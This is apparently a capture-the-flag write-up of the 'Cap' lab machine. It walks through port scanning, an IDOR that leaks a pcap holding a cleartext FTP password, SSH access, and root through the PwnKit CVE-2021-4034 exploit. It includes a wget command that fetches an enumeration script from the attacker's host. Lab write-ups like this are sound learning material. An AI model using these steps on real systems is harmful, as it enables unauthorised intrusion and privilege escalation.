# Cap
## Recon
We start by scanning the server with `nmap -sV -sC -Pn 10.10.10.245` (check service version, run default script, treat host as up) and see:
```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Wed, 17 Aug 2022 08:42:05 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```
And the entire Get request to the target's web page. I thought this was weird at first, but pushed on.

I visited 10.10.10.245:80 and saw I was logged in as "Nathan". Good start. Can probably use this info to get a foothold.

*In the background I was fuzzing the host. I couldn't find a file suffix, and just decided to run a directory scan with ffuf `ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt:FUZZ -u http://10.10.10.245:80/FUZZ`. Nothing of interest was found.*

The website was pretty barebones, there was a search field that did nothing, and a service that offered users to download .pcap files of all the website traffic. I had a look under /data/1 and /data/2 that were full of my ffuf requests. Again, nothing of use.

I checked the dev console and found another entire web page built under what was being shown. I hid the current elements, and found notifications and settings for Nathan in the html. I kept looking through the source code - no links, nothing of use, just some JS buttons and html text.

I spent an hour or so scoping the website out, with and without Burp until I decided to check for IDOR vulnerability with the PCAP files.

For those that don't know, IDOR (Insecure Direct Object Reference) is an access control vulnerability. In essence, it allows user supplied input to retrieve resources they shouldn't have access to. Essentially, I decided to see if I could force any other .pcap files through the /data/ directory. At first nothing, but browsing to /data/0, I found traffic from before I began to attack the host.

Opening the file in Wireshark, I could see that there was FTP traffic in the file. I decided to follow the string of pcakets and saw that not only had Nathan tried to access FTP, but his password was listed in cleartext - *Buck3tH4TF0RM3!*.

I had a quick look at FTP on the server using the creds - grabbed user.txt. Nothing else of note really and decided to try and use the creds to SSH into the machine as well - success.

## PrivEsc
I had a look at SUID processes, nothing of note with the S bit was listed though, so I decided to run linpeas instead.

On my host machine, I navigated to the folder containing linpeas.sh, and hosted a http server `python3 -m http.server 9001`, and then requested the file on the target with `wget http://10.10.14.15:9001/linpeas.sh`.

Running linpeas on the target I found 2 notable vulnerabilities:
```
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

But even more notably (and lazier lol)
```
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034
```

Work smarter not harder. :triumph:

I found a really easy script on [GitHub](https://github.com/berdav/CVE-2021-4034) to run by berdav.

After cloning to my machine - `git clone https://github.com/berdav/CVE-2021-4034`, I used the same python server to serve this exploit to the target. (I'm not sure if there's an easier way to get ALL the files at the same time, but I wasted a few minutes copying them individually across).

Following the instructions on the GitHub page, I built the program, ran it and immediately had root access. Grabbed the flag in /root/ and called it a night.
